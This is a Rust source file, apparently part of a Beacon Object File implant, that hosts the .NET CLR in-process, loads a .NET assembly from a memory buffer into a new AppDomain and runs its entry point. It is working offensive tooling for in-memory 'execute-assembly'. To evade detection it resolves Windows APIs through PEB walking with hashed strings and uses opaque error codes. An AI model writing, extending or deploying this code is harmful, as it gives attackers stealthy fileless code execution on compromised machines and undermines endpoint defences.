use crate::error::BofError;
use crate::pe_parser::{AsmInfo, ClrVersion};
use alloc::vec::Vec;
use core::ffi::c_void;
use opsec_com::appdomain::{AppDomain, Assembly, MethodInfo};
use opsec_com::bstr::OwnedBstr;
use opsec_com::clr::{ICorRuntimeHost, start_clr};
use opsec_com::comptr::{ComPtr, IUnknown};
use opsec_com::guids::IID_APP_DOMAIN;
use opsec_com::safearray::{OwnedSafeArray, SafeArray, VT_BSTR, VT_UI1, VT_VARIANT};
use opsec_com::variant::Variant;

const V4_VERSION: &[u16] = &[
    b'v' as u16, b'4' as u16, b'.' as u16, b'0' as u16, b'.' as u16,
    b'3' as u16, b'0' as u16, b'3' as u16, b'1' as u16, b'9' as u16, 0,
];
const V2_VERSION: &[u16] = &[
    b'v' as u16, b'2' as u16, b'.' as u16, b'0' as u16, b'.' as u16,
    b'5' as u16, b'0' as u16, b'7' as u16, b'2' as u16, b'7' as u16, 0,
];

pub unsafe fn start(info: &AsmInfo) -> Result<ComPtr<ICorRuntimeHost>, BofError> {
    let version = match info.version {
        ClrVersion::V4 => V4_VERSION,
        ClrVersion::V2 => V2_VERSION,
    };
    unsafe { start_clr(version).map_err(|hr| BofError::Clr { hr, op: "c1" }) }
}

pub unsafe fn create_domain(
    host: &ComPtr<ICorRuntimeHost>,
    name: &str,
) -> Result<ComPtr<AppDomain>, BofError> {
    unsafe {
        let mut wname: Vec<u16> = name.encode_utf16().collect();
        wname.push(0);
        let mut domain_unk: *mut c_void = core::ptr::null_mut();
        let h = host.as_raw();
        let hr = ((*(*h).vtbl).create_domain)(
            h as *mut c_void,
            wname.as_ptr(),
            core::ptr::null_mut(),
            &mut domain_unk,
        );
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c2" });
        }
        let mut domain: *mut c_void = core::ptr::null_mut();
        let unk = domain_unk as *mut IUnknown;
        let hr = ((*(*unk).vtbl).query_interface)(
            unk as *mut c_void,
            &IID_APP_DOMAIN,
            &mut domain,
        );
        ((*(*unk).vtbl).release)(unk as *mut c_void);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c3" });
        }
        ComPtr::<AppDomain>::from_raw(domain as *mut _)
            .ok_or(BofError::Clr { hr: -1, op: "c4" })
    }
}

pub unsafe fn load_assembly(
    domain: &ComPtr<AppDomain>,
    asm: &[u8],
) -> Result<ComPtr<Assembly>, BofError> {
    unsafe {
        let sa = OwnedSafeArray::create(VT_UI1, asm.len() as u32)
            .ok_or(BofError::Clr { hr: -1, op: "c5" })?;

        // Use SafeArrayAccessData / SafeArrayUnaccessData to properly lock the
        // array before writing — matches the legacy C implementation's approach.
        let oleaut = opsec_peb::resolve_module(opsec_strcrypt::hash!("oleaut32.dll"))
            .ok_or(BofError::Clr { hr: -1, op: "c5a" })?;
        let access_fn = opsec_peb::resolve_export(
            oleaut,
            opsec_strcrypt::hash!("SafeArrayAccessData"),
        )
        .ok_or(BofError::Clr { hr: -1, op: "c5b" })?;
        let unaccess_fn = opsec_peb::resolve_export(
            oleaut,
            opsec_strcrypt::hash!("SafeArrayUnaccessData"),
        )
        .ok_or(BofError::Clr { hr: -1, op: "c5c" })?;

        type AccessFn =
            unsafe extern "system" fn(*mut SafeArray, *mut *mut c_void) -> i32;
        type UnaccessFn = unsafe extern "system" fn(*mut SafeArray) -> i32;
        let sa_access: AccessFn = core::mem::transmute(access_fn);
        let sa_unaccess: UnaccessFn = core::mem::transmute(unaccess_fn);

        let mut pv: *mut c_void = core::ptr::null_mut();
        let hr = sa_access(sa.ptr, &mut pv);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c5d" });
        }
        core::ptr::copy_nonoverlapping(asm.as_ptr(), pv as *mut u8, asm.len());
        sa_unaccess(sa.ptr);

        let d = domain.as_raw();
        let mut asm_ptr: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*d).vtbl).load_3)(d as *mut c_void, sa.ptr, &mut asm_ptr);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c6" });
        }
        ComPtr::<Assembly>::from_raw(asm_ptr as *mut _)
            .ok_or(BofError::Clr { hr: -1, op: "c7" })
    }
}

pub unsafe fn invoke(
    asm: &ComPtr<Assembly>,
    args_str: &str,
    _entry_point: u32,
) -> Result<(), BofError> {
    unsafe {
        let a = asm.as_raw();
        let mut mi_ptr: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*a).vtbl).entry_point)(a as *mut c_void, &mut mi_ptr);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c8" });
        }
        let mi = mi_ptr as *mut MethodInfo;

        let tokens: Vec<&str> = args_str.split_whitespace().collect();
        let args_sa = OwnedSafeArray::create(VT_VARIANT, 1)
            .ok_or(BofError::Clr { hr: -1, op: "c9" })?;
        let bstr_array = OwnedSafeArray::create(VT_BSTR, tokens.len() as u32)
            .ok_or(BofError::Clr { hr: -1, op: "cA" })?;

        if let Some(oleaut) =
            opsec_peb::resolve_module(opsec_strcrypt::hash!("oleaut32.dll"))
        {
            if let Some(put) = opsec_peb::resolve_export(
                oleaut,
                opsec_strcrypt::hash!("SafeArrayPutElement"),
            ) {
                type PutFn = unsafe extern "system" fn(
                    *mut SafeArray,
                    *const i32,
                    *mut c_void,
                ) -> i32;
                let put_f: PutFn = core::mem::transmute(put);
                for (i, t) in tokens.iter().enumerate() {
                    let wide: Vec<u16> = t.encode_utf16().collect();
                    if let Some(bstr) = OwnedBstr::from_utf16(&wide) {
                        let idx = i as i32;
                        put_f(bstr_array.ptr, &idx, bstr.s as *mut c_void);
                        core::mem::forget(bstr);
                    }
                }
                let mut wrapper: Variant = core::mem::zeroed();
                wrapper.vt = 0x2008u16;
                wrapper.payload[0] = bstr_array.ptr as u64;
                let idx: i32 = 0;
                put_f(
                    args_sa.ptr,
                    &idx,
                    &mut wrapper as *mut Variant as *mut c_void,
                );
                core::mem::forget(bstr_array);
            }
        }

        let mut retval: Variant = core::mem::zeroed();
        let obj: Variant = core::mem::zeroed();
        let hr = ((*(*mi).vtbl).invoke_3)(mi as *mut c_void, obj, args_sa.ptr, &mut retval);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "cB" });
        }
        Ok(())
    }
}
